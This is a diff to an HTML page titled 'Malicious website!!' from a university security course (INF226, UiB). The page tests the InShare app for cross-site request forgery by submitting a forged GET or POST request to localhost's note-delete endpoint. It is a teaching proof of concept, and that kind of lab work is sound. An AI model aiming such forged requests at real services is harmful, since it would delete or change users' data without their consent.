@@ -8,7 +8,7 @@
   </head>
   <body>
     <div class="container">
-      <h1>Malicious website!!</h1>
+      <h1 class="header">Malicious website!!</h1>
       <p class="text">
         This is a site made for testing the presence of CSRF-vulnerability in
         InShare.
@@ -18,30 +18,43 @@
         course INF226 at UiB.
       </p>
 
-      <!-- Input for Note ID -->
-      <input
-        type="text"
-        name="Note id"
-        id="noteid"
-        class="input"
-        placeholder="Enter Note ID"
-      />
+      <!-- Form to send request with a dropdown for method selection -->
+      <form
+        id="csrf-form"
+        action="http://localhost:8080/note/delete/"
+        method="GET"
+        onsubmit="setFormMethod()"
+      >
+        <!-- Input for Note ID -->
+        <input
+          type="text"
+          name="noteID"
+          id="noteid"
+          class="input"
+          placeholder="Enter Note ID"
+          required
+        />
 
-      <!-- Button to trigger the CSRF action -->
-      <a id="csrf-link" href="#" class="button-link">
-        <div>TEST CSRF-vulnerability by clicking this</div>
-      </a>
+        <!-- Dropdown to select GET or POST method -->
+        <select id="method-select" class="input">
+          <option value="GET">GET</option>
+          <option value="POST">POST</option>
+        </select>
+
+        <!-- Submit button to trigger the CSRF action -->
+        <button type="submit" class="button-link">
+          TEST CSRF-vulnerability by clicking this
+        </button>
+      </form>
     </div>
 
     <script>
-      document.getElementById("csrf-link").onclick = function () {
-        var noteID = document.getElementById("noteid").value;
-        if (noteID) {
-          this.href = "http://localhost:8080/note/delete/" + noteID;
-        } else {
-          alert("Please enter a Note ID before proceeding.");
-        }
-      };
+      function setFormMethod() {
+        // Get the selected method from the dropdown
+        var selectedMethod = document.getElementById("method-select").value;
+        // Set the form's method attribute based on the dropdown selection
+        document.getElementById("csrf-form").method = selectedMethod;
+      }
     </script>
   </body>
 </html>
